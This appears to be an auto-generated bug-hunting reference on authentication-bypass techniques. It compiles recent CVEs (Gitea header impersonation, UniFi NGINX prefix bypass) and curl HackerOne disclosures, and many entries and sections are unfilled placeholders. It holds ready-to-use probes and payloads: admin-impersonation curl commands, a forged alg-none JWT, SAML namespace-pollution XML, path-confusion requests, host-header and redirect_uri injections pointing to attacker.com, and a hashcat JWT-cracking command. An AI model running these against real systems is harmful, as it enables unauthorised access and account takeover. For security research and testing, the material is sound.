# Auth Bypass Techniques

> Tracked CVEs and techniques for this class. Updated via daily `refresh-latest` pipeline.

_Last updated: 2026-07-08 · Items: 1_

## 2026-07-08 — Gitea Docker Reverse Proxy Header Auth Bypass (CVE-2026-20896)

### Gitea Docker: X-WEBAUTH-USER Header Impersonation via Untrusted Proxy Default
- **Date:** 2026-07-08 · **Source:** [hivesecurity.gitlab.io](https://hivesecurity.gitlab.io/blog/gitea-forgejo-nine-cves-1263-security-release-2026/) · **Class:** cve
- **What:** Gitea Docker ≤1.26.2 defaults `REVERSE_PROXY_TRUSTED_PROXIES=*`; attacker injects `X-WEBAUTH-USER: admin` header to impersonate any user with zero credentials — no auth, no token.
- **Why it matters:** CVSS 9.8, active exploitation as of 2026-07-07; ~6,200 exposed instances estimated; full repo/secrets compromise on any self-hosted Gitea with reverse proxy auth enabled.
- **Hunt signal:** `curl -H "X-Webauth-User: gitea_admin" https://target/api/v1/users/search` — 200 with user data confirms bypass; or `nuclei -t CVE-2026-20896`
- **Evidence:** [source](https://hivesecurity.gitlab.io/blog/gitea-forgejo-nine-cves-1263-security-release-2026/) · [securityweek](https://www.securityweek.com/critical-gitea-flaw-under-active-exploitation-researchers-warn/) · [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-20896)

---

## What

_Define the class, prerequisites, and typical finding shape. Fill with real content._
_pending enrichment — baseline opener below_

See items under ## Items for per-finding details.

---

## CVEs

_No CVE-assigned items yet. Items below are pre-CVE or class-level findings._

---

## Probes

_Grep, curl, nuclei probes for this class. Append as items arrive with real PoCs._
_pending enrichment_

---

## PoCs

_Public PoC links rolled up from items below._

_No PoCs in items yet._

---

## Reproduction

_Step-by-step repro steps per CVE. Populated as items arrive with enough detail._
_pending enrichment_

---

## Defense

_Patch guidance and detection rules. Populated from vendor advisories._
_pending enrichment_

---

## References

_Populated by daily refresh-latest pipeline._

---

## Items

> Authentication bypass — exploiting implementation flaws in identity verification to gain access without valid credentials.

## Surface

- SAML SSO endpoints (`/saml/acs`, `/sso/callback`) — XML parsing vulnerabilities
- JWT tokens in `Authorization: Bearer` or cookies — algorithm confusion, weak secrets
- OAuth 2.0 flows — `redirect_uri`, `state` param, implicit grant token leakage
- Path normalization mismatches between proxy and backend (Nginx/Apache/IIS)
- Password reset flows — token predictability, host header injection, reuse
- `Authorization` header stripping by proxy, fallback to unauthenticated handler
- Multi-step auth with state kept in client-side cookie or hidden field

## Test Approach

1. **SAML attribute pollution** — intercept ACS request, duplicate attributes with different namespaces:

   ```xml
   <saml:Attribute Name="role">
     <saml:AttributeValue>user</saml:AttributeValue>
   </saml:Attribute>
   <saml:Attribute Name="role" xmlns:saml="http://evil.com">
     <saml:AttributeValue>admin</saml:AttributeValue>
   </saml:Attribute>
   ```

2. **XML signature wrapping (XSW)** — move the signed element, inject unsigned sibling with attacker data; use SAML Raider (Burp extension)
3. **JWT `alg: none`** — remove signature, set `"alg": "none"`, see if backend accepts:

   ```
   echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '='
   ```

4. **JWT RS256→HS256 confusion** — sign token with server's public key as HMAC secret
5. **JWT weak secret brute-force**:

   ```
   hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt
   ```

6. **OAuth state CSRF** — remove `state` param from authorization request; if accepted, CSRF to link attacker account
7. **Open redirect in redirect_uri** — try `redirect_uri=https://target.com/callback/../../../attacker.com`
8. **Path confusion bypass** (Nginx/Apache):

   ```
   GET /app/admin%2F..%2Fapi/sensitive HTTP/1.1
   GET /app/admin;/api/sensitive HTTP/1.1
   ```

9. **Password reset host header injection**:

   ```
   POST /reset-password HTTP/1.1
   Host: attacker.com
   ```

## Tools

- **SAML Raider** (Burp) — XSW attacks, signature stripping, attribute injection
- **jwt_tool** — test alg confusion, brute-force, claim manipulation; `python3 jwt_tool.py <token> -M at`
- **hashcat** — JWT HMAC brute-force: `hashcat -a 0 -m 16500`
- **nuclei** — auth bypass templates: `nuclei -t auth-bypass/ -u https://target.com`
- **ffuf** — path confusion fuzzing with encoded variants

## Payloads / Probes

```
# JWT none algorithm (header.payload. — no sig)
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.

# Path confusion (Nginx strips prefix, Apache doesn't normalize)
GET /api/v1/admin%2F..%2Fusers HTTP/1.1

# SAML namespace confusion — inject admin role under different NS
<Attribute Name="role" xmlns="urn:oasis:names:tc:SAML:2.0:assertion">
  <AttributeValue>admin</AttributeValue>
</Attribute>

# OAuth open redirect
?redirect_uri=https://target.com/callback%0d%0aLocation:https://attacker.com

# Cookie prefix bypass (server-side only — inject raw)
Cookie: __Host-session=attacker_value
```

## Chain Opportunities

- **Auth bypass → full ATO** — bypass login, access admin panel
- **SAML bypass → multi-tenant escalation** — assume any tenant's identity in SSO
- **JWT none → privilege escalation** — forge admin role claim
- **Path confusion + auth bypass → SSRF** — reach internal endpoints past auth middleware
- **Password reset + host injection → ATO** — reset link sent to attacker-controlled domain

## Recent Intel

- **The Fragile Lock** · Ruby/PHP SAML attribute pollution + namespace confusion → full auth bypass, PoC published · https://portswigger.net/research/the-fragile-lock
- **SAML Roulette (GitLab)** · `ruby-saml` XML signature bypass via namespace spoofing → unauthenticated admin access on GitLab Enterprise · https://portswigger.net/research/saml-roulette-the-hacker-always-wins
- **CVE-2025-0108** · PAN-OS Nginx/Apache path confusion → pre-auth bypass to protected management API · https://www.assetnote.io/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os

## 2026-04-19 — H1 disclosures

### lib/http2.c: SSL connections accept non-HTTP push schemes (incomplete fix for 2e8c922a)

- **2026-04-16** · sev: Medium · bounty: undisclosed
- Source: [hackerone.com/3674275](https://hackerone.com/reports/3674275) · Reporter: [@hybirdss](https://hackerone.com/hybirdss) · Team: [curl](https://hackerone.com/curl)
- CWE: Authentication Bypass by Primary Weakness

**What**

_No H1 summary provided._

**Hunt signal:** pass — summary too thin

---

### Improper enforcement of CURLOPT_SOCKS5_AUTH due to missing reuse key validation in libcurl

- **2026-04-07** · sev: Low · bounty: undisclosed
- Source: [hackerone.com/3650435](https://hackerone.com/reports/3650435) · Reporter: [@cutiapretaa](https://hackerone.com/cutiapretaa) · Team: [curl](https://hackerone.com/curl)
- CWE: Improper Authorization

**What**

_No H1 summary provided._

**Hunt signal:** pass — summary too thin

---

### Missing server identity policy enforcement in SSH connection reuse allows host key verification bypass via pool poisoning

- **2026-04-03** · sev: High · bounty: undisclosed · cve: CVE-2022-27782, CVE-2023-27538
- Source: [hackerone.com/3640932](https://hackerone.com/reports/3640932) · Reporter: [@intrax71](https://hackerone.com/intrax71) · Team: [curl](https://hackerone.com/curl)
- CWE: Authentication Bypass by Primary Weakness

**What**

_No H1 summary provided._

**PoC refs:** search `github.com/search?q=CVE-2022-27782` · [trickest/cve](https://github.com/trickest/cve/blob/main/CVE-2022-27782.md) · [nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)

**Hunt signal:** pass — summary too thin

---

### HackerOne Vulnerability Report: libcurl SSL/TLS Identity Leakage via Insecure Connection Reuse

- **2026-03-31** · sev: — · bounty: undisclosed
- Source: [hackerone.com/3636244](https://hackerone.com/reports/3636244) · Reporter: [@ankitsingh131225](https://hackerone.com/ankitsingh131225) · Team: [curl](https://hackerone.com/curl)
- CWE: Authentication Bypass by Primary Weakness

**What**

_No H1 summary provided._

**Hunt signal:** pass — summary too thin

---

### CVE-2026-3784: wrong proxy connection reuse with credentials

- **2026-03-11** · sev: Low · bounty: undisclosed · cve: CVE-2026-3784
- Source: [hackerone.com/3584903](https://hackerone.com/reports/3584903) · Reporter: [@nobcoder](https://hackerone.com/nobcoder) · Team: [curl](https://hackerone.com/curl)
- CWE: Incorrect Authorization

**What**

_No H1 summary provided._

**PoC refs:** search `github.com/search?q=CVE-2026-3784` · [trickest/cve](https://github.com/trickest/cve/blob/main/CVE-2026-3784.md) · [nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)

**Hunt signal:** pass — summary too thin

---


## 2026-05-27 — H1 disclosures

### Connection reuse ignores haproxyprotocol and HAPROXY_CLIENT_IP settings, allowing PROXY context to persist across transfers

- **2026-05-19** · sev: None · bounty: undisclosed · cve: CVE-2026-4873, CVE-2026-5545, CVE-2026-5773, CVE-2026-6429, CVE-2026-6253, CVE-2026-7168, CVE-2026-3784, CVE-2026-3805
- Source: [hackerone.com/3741135](https://hackerone.com/reports/3741135) · Reporter: [@7omoo](https://hackerone.com/7omoo) · Team: [curl](https://hackerone.com/curl)
- CWE: Incorrect Authorization

**What**

_No H1 summary provided._

**PoC refs:** search `github.com/search?q=CVE-2026-4873` · [trickest/cve](https://github.com/trickest/cve/blob/main/CVE-2026-4873.md) · [nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)

**Hunt signal:** pass — summary too thin

---

### Negotiate connection reuse with wrong credentials when using CURLAUTH_ANY                                        

- **2026-04-29** · sev: Medium · bounty: undisclosed · cve: CVE-2026-1965
- Source: [hackerone.com/3646072](https://hackerone.com/reports/3646072) · Reporter: [@anonymous_237](https://hackerone.com/anonymous_237) · Team: [curl](https://hackerone.com/curl)
- CWE: Authentication Bypass by Primary Weakness

**What**

_No H1 summary provided._

**PoC refs:** search `github.com/search?q=CVE-2026-1965` · [trickest/cve](https://github.com/trickest/cve/blob/main/CVE-2026-1965.md) · [nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)

**Hunt signal:** pass — summary too thin

---

### CVE-2026-5545: wrong reuse of HTTP Negotiate connection

- **2026-04-29** · sev: Medium · bounty: undisclosed · cve: CVE-2026-5545
- Source: [hackerone.com/3642555](https://hackerone.com/reports/3642555) · Reporter: [@quaccws](https://hackerone.com/quaccws) · Team: [curl](https://hackerone.com/curl)
- CWE: Authentication Bypass by Primary Weakness

**What**

_No H1 summary provided._

**PoC refs:** search `github.com/search?q=CVE-2026-5545` · [trickest/cve](https://github.com/trickest/cve/blob/main/CVE-2026-5545.md) · [nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)

**Hunt signal:** pass — summary too thin

---


## 2026-06-27 — Ubiquiti UniFi OS NGINX Path Confusion Chain

### Ubiquiti UniFi OS — NGINX Prefix Bypass → Unauthenticated Root RCE (CVE-2026-34908/34909/34910)
- **Date:** 2026-06-27 · **Source:** [bishopfox.com](https://bishopfox.com/blog/popping-root-on-unifi-os-server-unauthenticated-rce-chain-detection-analysis) · **Class:** cve
- **What:** NGINX location-block prefix matching resolves an auth-exempt URL prefix to an authenticated internal backend route, bypassing access control; chained with path traversal (CVE-2026-34909) and input validation flaw (CVE-2026-34910) for unauthenticated root RCE on all UniFi OS devices.
- **Why it matters:** CVSS 10.0, all three KEV'd 2026-06-23 with active exploitation; the NGINX prefix-bypass auth pattern generalizes to any NGINX reverse proxy with misconfigured location blocks — test any `/public/` or exempt prefix that forwards to an authenticated upstream.
- **Hunt signal:** `curl -sv "https://TARGET/public/../api/v2/auth/me" 2>&1 | grep -E "< HTTP|200|403"` — mismatch vs direct `/api/v2/auth/me` indicates prefix bypass
- **Evidence:** [NVD CVE-2026-34908](https://nvd.nist.gov/vuln/detail/CVE-2026-34908) · [BishopFox RCE chain](https://bishopfox.com/blog/popping-root-on-unifi-os-server-unauthenticated-rce-chain-detection-analysis) · [CISA KEV 2026-06-23](https://www.cisa.gov/news-events/alerts/2026/06/23/cisa-adds-four-known-exploited-vulnerabilities-catalog) · [Ubiquiti SA-064](https://community.ui.com/releases/Security-Advisory-Bulletin-064-064/84811c09-4cf4-42ab-bd61-cc994445963b)

---


## 2026-07-01 — H1 disclosures

### ssh_config_matches is dead code: unauthorized SSH key reuse

- **2026-06-30** · sev: Medium · bounty: undisclosed · cve: CVE-2022-27782, CVE-2023-27538
- Source: [hackerone.com/3826843](https://hackerone.com/reports/3826843) · Reporter: [@bigsize](https://hackerone.com/bigsize) · Team: [curl](https://hackerone.com/curl)
- CWE: Authentication Bypass by Primary Weakness

**What**

_No H1 summary provided._

**PoC refs:** search `github.com/search?q=CVE-2022-27782` · [trickest/cve](https://github.com/trickest/cve/blob/main/CVE-2022-27782.md) · [nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)

**Hunt signal:** pass — summary too thin

---

### CVE-2026-8458: wrong reuse for different services

- **2026-06-24** · sev: Low · bounty: undisclosed · cve: CVE-2026-8458, CVE-2026-5545
- Source: [hackerone.com/3721183](https://hackerone.com/reports/3721183) · Reporter: [@areksaxyz](https://hackerone.com/areksaxyz) · Team: [curl](https://hackerone.com/curl)
- CWE: Authentication Bypass by Primary Weakness

**What**

_No H1 summary provided._

**PoC refs:** search `github.com/search?q=CVE-2026-8458` · [trickest/cve](https://github.com/trickest/cve/blob/main/CVE-2026-8458.md) · [nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)

**Hunt signal:** pass — summary too thin

---

### Taskcluster web-server OAuth2 authorization codes are reusable and the exchange handler checks the wrong expiry column

- **2026-06-23** · sev: Medium · bounty: $2,000
- Source: [hackerone.com/3734676](https://hackerone.com/reports/3734676) · Reporter: [@anshuman_bh](https://hackerone.com/anshuman_bh) · Team: [Mozilla](https://hackerone.com/mozilla)
- CWE: Authentication Bypass by Capture-replay

**What**

The Taskcluster web-server's OAuth2 token-exchange handler did not consume authorization codes and did not enforce the authorization-code expiry. A leaked authorization code could be replayed to mint additional bridge access tokens for the original user, past the 10-minute window required by the OAuth2 standard. The expiry check in the token-exchange handler and the bridge-token-to-credentials handler read the wrong expiry column, allowing expired codes to remain usable until the daily cleanup cron deleted them.

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---

### SSH/SFTP connection reuse can bypass SSH key identity after ssh_config_matches removal

- **2026-06-09** · sev: High · bounty: undisclosed · cve: CVE-2022-27782, CVE-2023-27538
- Source: [hackerone.com/3788506](https://hackerone.com/reports/3788506) · Reporter: [@byteray_ltd](https://hackerone.com/byteray_ltd) · Team: [curl](https://hackerone.com/curl)
- CWE: Authentication Bypass by Primary Weakness

**What**

_No H1 summary provided._

**PoC refs:** search `github.com/search?q=CVE-2022-27782` · [trickest/cve](https://github.com/trickest/cve/blob/main/CVE-2022-27782.md) · [nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)

**Hunt signal:** pass — summary too thin

---


## 2026-07-23 — H1 disclosures

### AWS *.a2z.com | Unauthenticated Clickhouse UI : Database access + SSRF

- **2026-07-22** · sev: High · bounty: undisclosed
- Source: [hackerone.com/3809407](https://hackerone.com/reports/3809407) · Reporter: [@notnotnotveg](https://hackerone.com/notnotnotveg) · Team: [AWS VDP](https://hackerone.com/aws_vdp)
- CWE: Authentication Bypass

**What**

_No H1 summary provided._

**Hunt signal:** pass — summary too thin

---

### SELECT ... INTO OUTFILE does not enforce the FILE WRITE privilege  unprivileged arbitrary file write on the   server

- **2026-07-13** · sev: High · bounty: undisclosed
- Source: [hackerone.com/3780695](https://hackerone.com/reports/3780695) · Reporter: [@bisht-ji](https://hackerone.com/bisht-ji) · Team: [SingleStore](https://hackerone.com/singlestore)
- CWE: Missing Authorization

**What**

A security vulnerability was reported in SingleStore's self-managed database server where the SELECT...INTO OUTFILE command did not properly enforce the FILE WRITE privilege. This allowed any authenticated user, including those with only USAGE privileges, to write arbitrary files to the aggregator host at any path, written as the engine OS user. The vulnerability affected default-configuration self-managed deployments, but was not present in SingleStore Helios due to the local_file_system_access_restricted setting. …

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---
